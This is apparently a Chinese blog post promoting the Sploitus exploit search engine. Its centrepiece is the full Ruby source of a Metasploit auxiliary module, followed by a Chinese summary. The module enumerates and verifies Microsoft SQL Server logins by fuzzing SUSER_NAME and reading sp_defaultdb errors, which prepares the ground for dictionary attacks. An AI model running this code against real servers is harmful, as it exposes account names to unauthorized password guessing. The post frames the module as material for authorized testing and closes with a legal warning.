#  Sploitus|Exploit 在线漏洞搜索引擎   
原创 蓝胖子之家  蓝胖子之家   2024-02-12 14:38  
  
**官网：https://sploitus.com/**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/REwWx1OBrpgu0hmHyYTQZWKm5jtvNezFyMu7d79EhUQt5Ig8z3PlmSc52HiaOOzb69v5WMZnQD2SRDFuXflJCMQ/640?wx_fmt=png&from=appmsg "")  
  
**Sploitus是一个在线漏洞搜索引擎，它提供了一个平台，让安全研究人员和黑客能够查找已知的软件漏洞和安全漏洞的信息。它的目的是帮助用户发现和了解已知的漏洞，以便更好地保护自己的系统和网络。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/REwWx1OBrpgu0hmHyYTQZWKm5jtvNezFdO54wDpjQtbOdquP3QYARv7WF4dv1o3ibeicutica4YzlwTL4PAfC8osw/640?wx_fmt=png&from=appmsg "")  
  
**在Sploitus数据库中包含了大量的漏洞信息，包括已公开披露的漏洞、CVE（通用漏洞和披露）编号、漏洞描述、影响的软件和版本、漏洞的利用方式等。用户可以通过搜索关键字、软件名称、CVE编号等方式来查找相关的漏洞信息。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/REwWx1OBrpgu0hmHyYTQZWKm5jtvNezFKRxXLELT3K7PPx2Tm5n1AsGjYYuiaJQlgL8BLIsXx3a9icEK1Vic64WTw/640?wx_fmt=png&from=appmsg "")  
  
**下面是一个Metasploit框架中的辅助模块，**  
**用于在Microsoft SQL Server中枚举SQL登录名的漏洞利用。**  
```
## https://sploitus.com/exploit?id=MSF:AUXILIARY-ADMIN-MSSQL-MSSQL_ENUM_SQL_LOGINS-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
include Msf::Exploit::Remote::MSSQL

def initialize(info = {})
super(update_info(info,
'Name' => 'Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration',
'Description' => %q{
This module can be used to obtain a list of all logins from a SQL Server with any login.
Selecting all of the logins from the master..syslogins table is restricted to sysadmins.
However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server
logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is
pretty simple, because the principal IDs assigned to logins are incremental. Once logins
have been enumerated they can be verified via sp_defaultdb error analysis. This is
important, because not all of the principal IDs resolve to SQL logins (some resolve to
roles instead). Once logins have been enumerated, they can be used in dictionary attacks.
},
'Author' => ['nullbind <scott.sutherland[at]netspi.com>'],
'License' => MSF_LICENSE,
'References' => [['URL','https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']]
))

register_options(
[
OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 300]),
])
end

def run
# Check connection and issue initial query
print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
if mssql_login_datastore
print_good('Connected.')
else
print_error('Login was unsuccessful. Check your credentials.')
disconnect
return
end

# Query for sysadmin status
print_status("Checking if #{datastore['USERNAME']} has the sysadmin role...")
user_status = check_sysadmin

# Check if user has sysadmin role
if user_status == 1
print_good("#{datastore['USERNAME']} is a sysadmin.")
else
print_status("#{datastore['USERNAME']} is NOT a sysadmin.")
end

# Get a list if sql server logins using SUSER_NAME()
print_status("Setup to fuzz #{datastore['FuzzNum']} SQL Server logins.")
print_status('Enumerating logins...')
sql_logins_list = get_sql_logins
if sql_logins_list.nil? || sql_logins_list.empty?
print_error('Sorry, somethings went wrong - SQL Server logins were found.')
disconnect
return
else
# Print number of initial logins found
print_good("#{sql_logins_list.length} initial SQL Server logins were found.")

sql_logins_list.sort.each do |sql_login|
if datastore['VERBOSE']
print_status(" - #{sql_login}")
end
end
end

# Verify the enumerated SQL Logins using sp_defaultdb error ananlysis
print_status('Verifying the SQL Server logins...')
sql_logins_list_verified = verify_logins(sql_logins_list)
if sql_logins_list_verified.nil?
print_error('Sorry, no SQL Server logins could be verified.')
disconnect
return
else

# Display list verified SQL Server logins
print_good("#{sql_logins_list_verified.length} SQL Server logins were verified:")
sql_logins_list_verified.sort.each do |sql_login|
print_status(" - #{sql_login}")
end
end

disconnect
end

# Checks if user is a sysadmin
def check_sysadmin
# Setup query to check for sysadmin
sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"

# Run query
result = mssql_query(sql)

# Parse query results
parse_results = result[:rows]
status = parse_results[0][0]

# Return status
return status
end

# Gets trusted databases owned by sysadmins
def get_sql_logins
# Create array to store the sql logins
sql_logins = []

# Fuzz the principal_id parameter passed to the SUSER_NAME function
(1..datastore['FuzzNum']).each do |principal_id|
# Setup query
sql = "SELECT SUSER_NAME(#{principal_id}) as login"

# Execute query
result = mssql_query(sql)

# Parse results
parse_results = result[:rows]
sql_login = parse_results[0][0]

# Add to sql server login list
sql_logins.push(sql_login) unless sql_logins.include?(sql_login)
end

# Return list of logins
sql_logins
end

# Checks if user has the db_owner role
def verify_logins(sql_logins_list)

# Create array for later use
verified_sql_logins = []

fake_db_name = Rex::Text.rand_text_alpha_upper(24)

# Check if the user has the db_owner role is any databases
sql_logins_list.each do |sql_login|
# Setup query
sql = "EXEC sp_defaultdb '#{sql_login}', '#{fake_db_name}'"

# Execute query
result = mssql_query(sql)

# Parse results
parse_results = result[:errors]
result = parse_results[0]

# Check if sid resolved to a sql login
if result.include?(fake_db_name)
verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)
end

# Check if sid resolved to a sql login
if result.include?('alter the login')
# Add sql server login to verified list
verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)
end
end

verified_sql_logins
end
end
```  
  
该模块可以用于从具有任何登录名的SQL Server获取所有登录名的列表。  
通过使用SUSER_SNAME函数对principal_id参数进行模糊测试，可以快速枚举所有SQL Server登录名。  
登录名的principal_id是递增的，因此可以通过模糊测试来枚举登录名。  
一旦枚举了登录名，可以通过sp_defaultdb错误分析来验证它们。  
验证登录名很重要，因为不是所有的principal_id都对应于SQL登录名（有些对应于角色）。  
一旦枚举了登录名，就可以用于字典攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/REwWx1OBrpgu0hmHyYTQZWKm5jtvNezF1lmSVMpXyVgsJVaoiciagRB0cH7lN9xKjxvqXzmV261WctWic9eVIAffQ/640?wx_fmt=png&from=appmsg "")  
  
**在日常渗透测试中使用Sploitus，可以更方便地了解已知的漏洞，以便进行漏洞分析、渗透测试和安全评估。同时，黑客也可以利用Sploitus来搜索已知的漏洞，以便发起攻击或进行渗透测试。**  
  
****<table><tbody style="outline: 0px;"><tr style="outline: 0px;"><td width="557" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76);" class="js_darkmode__3" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><strong style="outline: 0px;color: rgb(255, 41, 65);letter-spacing: 0.578px;"><span style="outline: 0px;font-size: 14px;">非常重要的一点是，我们要明确使用计算机和编程技术的目的是为了学习和测试，而不是进行非法攻击或者违法行为。编写和使用代码时，我们必须遵守法律法规，并且获得相关授权。如果您有合法的目的和授权，那么可以继续进行测试和使用。但是，如果您违反了法律法规或者未经授权使用，后果将由您自己承担。请务必谨慎行事，遵守法律规定，以确保计算机和网络的安全。</span></strong></td></tr></tbody></table>  
<table><tbody style="outline: 0px;"><tr style="outline: 0px;"><td width="557" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76);" class="js_darkmode__4" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><span style="outline: 0px;">小黑板：</span><span style="text-align: start;outline: 0px;"><span style="outline: 0px;">非法攻击计算机系统是一种违法行为，违反了计算机安全法规。根据中华人民共和国刑法，非法攻击计算机系统可能构成</span>非法侵入计算机信息系统罪<span style="outline: 0px;">、非法获取计算机信息系统数据、非法控制计算机信息系统罪、提供侵入、非法控制计算机信息系统程序、工具罪等罪名。根据《中华人民共和国刑法》规定，违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚</span><br style="outline: 0px;"/><br style="outline: 0px;"/></span></td></tr></tbody></table>  
  
  
  
****  
  
  
